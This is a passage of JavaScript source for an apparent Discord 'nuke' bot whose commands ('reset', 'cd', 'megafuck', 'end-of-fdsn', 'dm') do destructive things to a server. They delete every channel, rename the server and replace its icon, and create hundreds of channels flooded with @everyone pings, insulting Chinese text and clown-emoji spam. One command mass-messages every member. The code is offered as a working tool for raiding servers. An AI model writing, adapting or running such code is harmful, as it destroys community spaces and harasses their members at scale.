                                channel.send('https://tenor.com/view/minecraft-reddit-funny-gif-14138658?size=我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。  @everyone @everyone @everyone @everyone @everyone @everyone ')
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }

            }
        }
        // If you give an input
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('https://tenor.com/view/minecraft-reddit-funny-gif-14138658?size=我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。  @everyone @everyone @everyone @everyone @everyone @everyone ')
                        console.log(blueBright(`CHANNEL PINGED!`));
                        // other per-channnel logic
                    }
                }
            );
        }
    }

  


    if (message.content.startsWith(prefix + 'reset')) {
        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`Canal resetado`))
        )); // deletes all channels
        message.delete();
        message.guild.setName(`.........................`);
        message.guild.setIcon('https://cdn.discordapp.com/attachments/791425530951630918/791476136286093362/Significado-da-cor-preto.webp');
    }




    if (message.content.startsWith(prefix + 'cd')) {
        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`Canal deletado`))
        )); // deletes all channels
        message.delete();
    }



    // Fuck the server      

    if (message.content.startsWith(prefix + 'megafuck')) {

        message.guild.setName(`F`).then(console.log(green(`F`))); // changes server name

        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`F`))
        )); // deletes all channels

        message.guild.setIcon('https://cdn.discordapp.com/attachments/791425530951630918/791425613176766514/d3ae5801962e28722f919ad172414e7c.png') // changes server pfp

        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');

        if (!argresult) {
            message.channel.send("*Add an input after the cmd*")
        } else {

            for (var i = 0; i < 250; i++) {
                let channels = message.guild.channels.create(argresult)

                channels.then(
                    function (channel, index) {
                        for (var i = 0; i < 250; i++) {
                            channel.send('🤡 🤡 🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡FDSN esteve aki 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡@everyone')
                            console.log(blueBright(`CHANNEL PINGED!`));
                            // other per-channnel logic
                        }
                    }
                )
            }

            message.delete()

        }

    }


      //the fuker


if (message.content.startsWith(prefix + 'end-of-fdsn')) {

        message.guild.setName(`F`).then(console.log(green(`F`))); // changes server name

        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`F`))
        )); // deletes all channels

        message.guild.setIcon('https://cdn.discordapp.com/attachments/791425530951630918/791425613176766514/d3ae5801962e28722f919ad172414e7c.png') // changes server pfp

        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');

        if (!argresult) {
            message.channel.send("*Add an input after the cmd*")
        } else {

            for (var i = 0; i < 250; i++) {
                let channels = message.guild.channels.create(argresult)

                channels.then(
                    function (channel, index) {
                        for (var i = 0; i < 250; i++) {
                            channel.send('@everyone F')
                            console.log(blueBright(`CHANNEL PINGED!`));
                            // other per-channnel logic
                        }
                    }
                )
            }

            message.delete()

        }

    }




    
    // VERY UNRELIABLE MASS DM

    if (message.content.startsWith(prefix + 'dm')) {

        if (!message.member.hasPermission("ADMINISTRATOR")) {
            message.delete();
            return message.reply(`*Imagine trying to mass dm*`).then(message => message.delete({ timeout: 2000 }))
        } else {

            let args = message.content.split(" ").slice(1);
            var argresult = args.join(" ");

            message.guild.members.cache.forEach(member => { // Looping through each member of the guild.  // mass dm
                // Trying to send a message to the member.
                // This method might fail because of the member's privacy settings, so we're using .catch
                member.send(argresult).catch(e => console.error(`Couldn't DM member ${member.user.tag}`)).then(console.log(`DM'd ${member.user.tag}`));
            });

        }
        message.delete();
    }
});

client.login(token);
